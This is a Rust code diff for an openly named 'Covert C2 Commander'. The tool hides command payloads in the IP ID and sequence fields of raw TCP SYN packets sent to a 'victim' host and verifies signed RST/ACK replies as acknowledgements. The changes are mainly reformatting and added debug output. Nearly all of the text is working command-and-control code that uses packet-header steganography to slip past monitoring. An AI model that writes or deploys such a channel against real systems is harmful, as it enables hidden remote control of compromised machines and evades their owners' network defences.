@@ -51,13 +51,12 @@ impl Commander {
         }
     }
 
-   fn send_covert_data(&self, payload: &[u8]) {
+    fn send_covert_data(&self, payload: &[u8]) {
         let victim_ip = self.victim_ip.expect("No victim IP");
         let local_ip = self.local_ip.expect("No local IP");
-        
-        // Convert payload into stateful chunks
+
         let mut state = covert::SenderState::new_from_bytes(payload);
-        
+
         let protocol = Layer3(IpNextHeaderProtocols::Tcp);
         let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
         let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
@@ -69,55 +68,92 @@ impl Commander {
 
                 while !acked && attempts < 5 {
                     attempts += 1;
-                    
-                    // Build and send the SYN packet containing covert data
+
+                    println!("\n[COMMANDER] Sending chunk index {}", state.index);
+                    println!("[COMMANDER] IP ID: {}", ip_id);
+                    println!("[COMMANDER] Masked SEQ: 0x{:08x}", masked_seq);
+
                     let syn_pkt = covert::build_syn_packet(
-                        local_ip, victim_ip,
-                        self.rx_port, self.tx_port, 
-                        ip_id, masked_seq
+                        local_ip,
+                        victim_ip,
+                        self.rx_port,
+                        self.tx_port,
+                        ip_id,
+                        masked_seq,
                     );
-                    
+
                     let _ = tx.send_to(
-                        pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), 
-                        IpAddr::V4(victim_ip)
+                        pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(),
+                        IpAddr::V4(victim_ip),
                     );
 
                     let start = std::time::Instant::now();
-                    // Wait 500ms for the Victim to respond with the signature
+
                     while start.elapsed() < Duration::from_millis(500) {
                         if let Ok((packet, _)) = rx_iter.next() {
-                            // FIX: Use 'victim_ip' instead of 'target_ip'
-                            if packet.get_source() == victim_ip {
-                                // Optional Debug: See the flags coming from the victim
-                                if let Some(tcp) = TcpPacket::new(packet.payload()) {
-                                     // println!("[DEBUG] Packet from Victim. Flags: {:b}", tcp.get_flags());
-                                }
 
-                                if let Some(recv_id) = covert::parse_rst_ack_signature(packet.packet()) {
-                                    let expected_sig = covert::signature_ip_id(ip_id, raw_word);
+                            if packet.get_source() != victim_ip {
+                                continue;
+                            }
+
+                            if let Some(tcp) = TcpPacket::new(packet.payload()) {
+
+                                println!("\n[COMMANDER] === PACKET RECEIVED ===");
+                                println!("[COMMANDER] From: {}", packet.get_source());
+                                println!("[COMMANDER] Flags: {:b}", tcp.get_flags());
+                                println!("[COMMANDER] Window: 0x{:04x}", tcp.get_window());
+
+                                if let Some(recv_id) =
+                                    covert::parse_rst_ack_signature(packet.packet())
+                                {
+                                    let expected_sig =
+                                        covert::signature_ip_id(ip_id, raw_word);
+
+                                    println!(
+                                        "[COMMANDER] Expected Signature: 0x{:04x}",
+                                        expected_sig
+                                    );
+                                    println!(
+                                        "[COMMANDER] Received Signature: 0x{:04x}",
+                                        recv_id
+                                    );
+
                                     if recv_id == expected_sig {
+                                        println!(
+                                            "[COMMANDER] ✅ Signature MATCHED — ACK accepted\n"
+                                        );
                                         state.ack();
                                         acked = true;
                                         break;
+                                    } else {
+                                        println!(
+                                            "[COMMANDER] ❌ Signature MISMATCH"
+                                        );
                                     }
-                                }                                
+                                }
                             }
                         }
                     }
-                    
+
                     if !acked {
-                        println!("[!] Timeout (Chunk {}), retry {}/5...", state.index, attempts);
+                        println!(
+                            "[!] Timeout (Chunk {}), retry {}/5...",
+                            state.index, attempts
+                        );
                     }
                 }
 
                 if !acked {
-                    println!("[!!!] Connection lost or Victim is not ACKing. Aborting command.");
+                    println!(
+                        "[!!!] Connection lost or Victim is not ACKing. Aborting command."
+                    );
                     return;
                 }
             }
         }
-        println!("[+] Command sent successfully.");
-    }
+
+        println!("[*] Command sent. Waiting for response from listener thread...");
+    }      
 
     pub fn run(&mut self) {
         println!("=== Covert C2 Commander ===");
